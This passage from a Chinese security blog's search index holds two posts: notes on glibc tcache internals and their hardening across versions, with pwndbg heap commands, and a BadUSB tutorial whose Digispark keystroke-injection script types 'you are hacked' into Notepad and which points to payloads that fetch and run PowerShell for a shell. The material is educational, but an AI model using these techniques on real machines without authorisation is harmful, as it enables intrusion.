bin中遍历，遍历完若tcachebin中有对应大小的chunk，从tcache中取出（最后一个遍历到的chunk），如果在这个遍历的过程中，放入tcache的chunk达到tcache_unsorted_limit，则会直接返回当前遍历到的unsorted chunk。</p></li><li><p>binning code（chunk合并等其他情况）中，每一个符合要求的 chunk 都会优先被放入 tcache，而不是直接返回（除非tcache被装满）。如：合并完后的大chunk也会被先放进tcache</p></li><li><p><code>tcache_perthread_struct</code>本身也是一个堆块，大小为<code>0x250</code>，位于堆开头的位置，包含数组<code>counts</code>存放每个<code>bin</code>中的<code>chunk</code>当前数量，以及数组<code>entries</code>存放<code>64</code>个<code>bin</code>的首地址（可以通过<strong>劫持此堆块</strong>进行攻击）。</p></li><li><p>calloc()可越过tcache取chunk</p></li><li><p>可将<code>tcache_count</code>整型溢出为<code>0xff</code>以绕过<code>tcache</code>，直接放入<code>unsorted bin</code>等，但在<code>libc-2.28</code>中，检测了<code>counts</code>溢出变成负数（<code>0x00-1=0xff</code>）的情况，且增加了对<code>double free</code>的检查。</p></li></ul><p>1.<strong>glibc2.26</strong>开始引入(ubuntu17.10) ，但从glibc2.27开始引入了许多针对tcache的保护</p><p>2.27新增：</p><ul><li><code>CVE-2017-17426</code>是<code>libc-2.26</code>存在的漏洞，<code>libc-2.27</code>已经修复</li></ul><p>2.28新增：</p><ul><li>检测了<code>tcache_count</code>溢出变成负数（<code>0x00-1=0xff</code>）的情况</li><li>增加了对<code>double free</code>的检查</li></ul><p>2.29新增：</p><ul><li>在<code>tcache_put</code>和<code>tcache_get</code>中增加了对<code>key</code>的检查，chunk放入tcache后在chunk的开头加了key标识，通过检查key来判断chunk是否已经在tcache中存在，以此检查是否存在<code>double free</code></li></ul><p>2.32新增：</p><ul><li>引入safe_unlink机制，<code>tcache</code>和<code>fastbin</code>的<code>fd</code>指针<code>异或加密</code></li></ul><p>源码(glibc2.26)：</p><p>malloc和free的函数中以及其它也有和tcache相关的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br><span class="hljs-comment">/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> TCACHE_MAX_BINS64</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> MAX_TCACHE_SIZEtidx2usize (TCACHE_MAX_BINS-1)</span><br><br><span class="hljs-comment">/* Only used to pre-fill the tunables.  */</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> tidx2usize(idx)(((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)</span><br><br><span class="hljs-comment">/* When &quot;x&quot; is from chunksize().  */</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)</span><br><span class="hljs-comment">/* When &quot;x&quot; is a user-provided size.  */</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> usize2tidx(x) csize2tidx (request2size (x))</span><br><br><span class="hljs-comment">/* With rounding and alignment, the bins are...</span><br><span class="hljs-comment">   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)</span><br><span class="hljs-comment">   idx 1   bytes 25..40 or 13..20</span><br><span class="hljs-comment">   idx 2   bytes 41..56 or 21..28</span><br><span class="hljs-comment">   etc.  */</span><br><br><span class="hljs-comment">/* This is another arbitrary limit, which tunables can change.  Each</span><br><span class="hljs-comment">   tcache bin will hold at most this number of chunks.  */</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> TCACHE_FILL_COUNT 7</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br><br><span class="hljs-comment">/* We overlay this structure on the user-data portion of a chunk when</span><br><span class="hljs-comment">   the chunk is stored in the per-thread cache.  */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span> *<span class="hljs-title">next</span>;</span>  <span class="hljs-comment">//tcache单链表的链表头</span><br>&#125; tcache_entry;<br><br><span class="hljs-comment">/* There is one of these for each thread, which contains the</span><br><span class="hljs-comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span><br><span class="hljs-comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span><br><span class="hljs-comment">   are redundant (we could have just counted the linked list each</span><br><span class="hljs-comment">   time), this is for performance reasons.  */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_perthread_struct</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">char</span> counts[TCACHE_MAX_BINS];<br>  tcache_entry *entries[TCACHE_MAX_BINS];      <span class="hljs-comment">//各个链表头构成的指针数组</span><br>&#125; tcache_perthread_struct;<br><br><span class="hljs-type">static</span> __thread <span class="hljs-type">char</span> tcache_shutting_down = <span class="hljs-number">0</span>;<br><span class="hljs-type">static</span> __thread tcache_perthread_struct *tcache = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span><br><span class="hljs-comment">   for more chunks.  */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">tcache_put</span> <span class="hljs-params">(mchunkptr chunk, <span class="hljs-type">size_t</span> tc_idx)</span><br>&#123;<br>  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<br>  assert (tc_idx &lt; TCACHE_MAX_BINS);          <span class="hljs-comment">//单链表未满7</span><br>  e-&gt;next = tcache-&gt;entries[tc_idx];    <br>  tcache-&gt;entries[tc_idx] = e;<br>  ++(tcache-&gt;counts[tc_idx]);<br>&#125;<br><br><span class="hljs-comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span><br><span class="hljs-comment">   available chunks to remove.  */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<br><span class="hljs-title function_">tcache_get</span> <span class="hljs-params">(<span class="hljs-type">size_t</span> tc_idx)</span><br>&#123;<br>  tcache_entry *e = tcache-&gt;entries[tc_idx];<br>  assert (tc_idx &lt; TCACHE_MAX_BINS);         <span class="hljs-comment">//在范围内</span><br>  assert (tcache-&gt;entries[tc_idx] &gt; <span class="hljs-number">0</span>);      <span class="hljs-comment">//对应大小的单链表不为空</span><br>  tcache-&gt;entries[tc_idx] = e-&gt;next;<br>  --(tcache-&gt;counts[tc_idx]);<br>  <span class="hljs-keyword">return</span> (<span class="hljs-type">void</span> *) e;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="pwndbg堆查看指令"><a href="#pwndbg堆查看指令" class="headerlink" title="pwndbg堆查看指令"></a>pwndbg堆查看指令</h2><h5 id="1-查看内存指令x："><a href="#1-查看内存指令x：" class="headerlink" title="1.查看内存指令x："></a>1.查看内存指令x：</h5><p>x &#x2F;nuf 0x123456 &#x2F;&#x2F;常用，x指令的格式是：x空格&#x2F;nfu，nfu代表三个参数</p><p>n代表显示几个单元（而不是显示几个字节，后面的u表示一个单元多少个字节），放在’&#x2F;‘后面<br>u代表一个单元几个字节，b(一个字节)，h(二个字节)，w(四字节)，g(八字节)<br>f代表显示数据的格式，f和u的顺序可以互换，也可以只有一个或者不带n，用的时候很灵活<br>x 按十六进制格式显示变量。<br>d 按十进制格式显示变量。<br>u 按十六进制格式显示无符号整型。<br>o 按八进制格式显示变量。<br>t 按二进制格式显示变量。<br>a 按十六进制格式显示变量。<br>c 按字符格式显示变量。<br>f 按浮点数格式显示变量。<br>s 按字符串显示。<br>b 按字符显示。<br>i 显示汇编指令。<br>x &#x2F;10gx 0x123456 &#x2F;&#x2F;常用，从0x123456开始每个单元八个字节，十六进制显示是个单元的数据</p><p>x &#x2F;10xd $rdi &#x2F;&#x2F;从rdi指向的地址向后打印10个单元，每个单元4字节的十进制数</p><p>x &#x2F;10i 0x123456 &#x2F;&#x2F;常用，从0x123456处向后显示十条汇编指令</p><h5 id="2-堆操作指令（pwndbg插件独有）"><a href="#2-堆操作指令（pwndbg插件独有）" class="headerlink" title="2.堆操作指令（pwndbg插件独有）"></a>2.堆操作指令（pwndbg插件独有）</h5><p>arena &#x2F;&#x2F;显示arena的详细信息<br>arenas &#x2F;&#x2F;显示所有arena的基本信息<br>arenainfo &#x2F;&#x2F;好看的显示所有arena的信息<br>bins &#x2F;&#x2F;常用，查看所有种类的堆块的链表情况<br>fastbins &#x2F;&#x2F;单独查看fastbins的链表情况<br>largebins &#x2F;&#x2F;同上，单独查看largebins的链表情况<br>smallbins &#x2F;&#x2F;同上，单独查看smallbins的链表情况<br>unsortedbin &#x2F;&#x2F;同上，单独查看unsortedbin链表情况<br>tcachebins &#x2F;&#x2F;同上，单独查看tcachebins的链表情况<br>tcache &#x2F;&#x2F;查看tcache详细信息<br>heap &#x2F;&#x2F;数据结构的形式显示所有堆块，会显示一大堆<br>heapbase &#x2F;&#x2F;查看堆起始地址<br>heapinfo、heapinfoall &#x2F;&#x2F;显示堆得信息，和bins的挺像的，没bins好用<br><strong>parseheap &#x2F;&#x2F;显示堆结构，很好用（不包括堆区域外通过uaf申请的内存）</strong><br>tracemalloc &#x2F;&#x2F;好用，会跟提示所有操作堆的地方</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
      <category>heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BadUsb-hid攻击初探</title>
    <link href="/2023/03/01/badusb%E5%88%9D%E6%8E%A2/"/>
    <url>/2023/03/01/badusb%E5%88%9D%E6%8E%A2/</url>
    
    <content type="html"><![CDATA[<h1 id="BadUsb-hid攻击初探"><a href="#BadUsb-hid攻击初探" class="headerlink" title="BadUsb - hid攻击初探"></a>BadUsb - hid攻击初探</h1><p>原理：usb伪装成键盘，模拟键盘进行输入</p><p><strong>一.淘宝上买个ATTINY85 Digispark kickstarter usb开发板。</strong></p><p><strong>二.下载Arduino IDE、Automator、hfs</strong></p><p>1.Automator用来写键盘模拟的脚本（.ino文件），非必要，但是方便写代码</p><p>Automator很好装，<a href="https://github.com/Catboy96/Automator">https://github.com/Catboy96/Automator</a></p><p>2.hfs用来在配置Arduino IDE时模拟从官网下载包的操作</p><p>下载：<a href="http://www.rejetto.com/hfs/?f=dl">http://www.rejetto.com/hfs/?f=dl</a></p><p>下了直接用</p><p>3.Arduino IDE 用来烧录</p><p>安装：</p><p>1.<a href="http://digistump.com/wiki/digispark/tutorials/connecting">http://digistump.com/wiki/digispark/tutorials/connecting</a></p><p>2.<a href="https://www.bilibili.com/video/BV1z64y147oc/?spm_id_from=333.788.recommend_more_video.0&amp;vd_source=4d7ceec86e24de9c1f10dcb04b1715f0">https://www.bilibili.com/video/BV1z64y147oc/?spm_id_from=333.788.recommend_more_video.0&amp;vd_source=4d7ceec86e24de9c1f10dcb04b1715f0</a></p><p>比较麻烦，两个都要看</p><p><strong>三.</strong></p><p>写脚本，Ducky Script脚本语言，写完生成ino文件</p><p>直接把ino文件里的代码复制到ide里面，不要打开文件</p><p>点上传，显示plug in device now的时候插u盘就行了，很快就能烧录完。</p><p>注意</p><p>1.能重复烧录，会覆盖上一次</p><p>2.烧录的时候把虚拟机关掉</p><p>测试脚本：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;DigiKeyboard.h&quot;</span><br><br>void loop<span class="hljs-literal">()</span> &#123;&#125;<br><br>void setup<span class="hljs-literal">()</span> &#123;<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>delay(<span class="hljs-number">1000</span>);<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>send<span class="hljs-constructor">KeyStroke(KEY_R, MOD_GUI_LEFT)</span>;<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>delay(<span class="hljs-number">200</span>);<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>print(<span class="hljs-string">&quot;notepad&quot;</span>);<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>delay(<span class="hljs-number">200</span>);<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>send<span class="hljs-constructor">KeyStroke(KEY_ENTER)</span>;<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>delay(<span class="hljs-number">200</span>);<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>send<span class="hljs-constructor">KeyStroke(KEY_ENTER)</span>;<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>delay(<span class="hljs-number">200</span>);<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>print(<span class="hljs-string">&quot;you&quot;</span>);<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>delay(<span class="hljs-number">200</span>);<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>send<span class="hljs-constructor">KeyStroke(KEY_ENTER)</span>;<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>delay(<span class="hljs-number">200</span>);<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>print(<span class="hljs-string">&quot; are&quot;</span>);<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>delay(<span class="hljs-number">200</span>);<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>send<span class="hljs-constructor">KeyStroke(KEY_ENTER)</span>;<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>delay(<span class="hljs-number">200</span>);<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>print(<span class="hljs-string">&quot; hacked&quot;</span>);<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>delay(<span class="hljs-number">200</span>);<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>send<span class="hljs-constructor">KeyStroke(KEY_ENTER)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>delay不能太小，不然输入会错乱</p><p>payloads：<a href="https://github.com/hak5/usbrubberducky-payloads">https://github.com/hak5/usbrubberducky-payloads</a></p><p>很多工具也有powershell payload生成功能，可以直接执行，也可以放到公网再下载执行</p><p>因为能模拟键盘并获取目标机器的shell，所以利用姿势很多。</p><p>其它还有wifi ducky，蓝牙的貌似也有，连上u盘自带的wiki就能实现远程上传ducky script脚本，tb没有，jd现成的150左右一个。</p>]]></content>
    
    
    <categories>
      
      <category>IOT</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IOT</tag>
      
      <tag>BadUsb</tag>
      
      <tag>Hardware</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
